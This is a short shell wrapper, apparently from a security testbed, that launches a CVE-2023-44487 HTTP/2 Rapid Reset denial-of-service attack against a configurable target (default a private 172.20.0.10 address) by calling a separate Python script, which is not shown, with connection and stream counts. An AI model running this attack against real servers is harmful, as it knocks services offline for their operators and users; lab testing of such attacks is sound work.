#!/bin/sh
# http2_rapid_reset.sh — CVE-2023-44487 HTTP/2 Rapid Reset attack.
#
# Delegates to http2_rapid_reset.py which uses the h2 library to open
# TLS/HTTP2 connections and send HEADERS + RST_STREAM bursts.
TARGET=${1:-172.20.0.10}
PORT=${2:-443}
CONNS=${3:-50}
STREAMS=${4:-100}

echo "[attack] HTTP/2 Rapid Reset -> $TARGET:$PORT  $CONNS conns  $STREAMS streams/conn"
python3 /attacks/http2_rapid_reset.py "$TARGET" "$PORT" "$CONNS" "$STREAMS"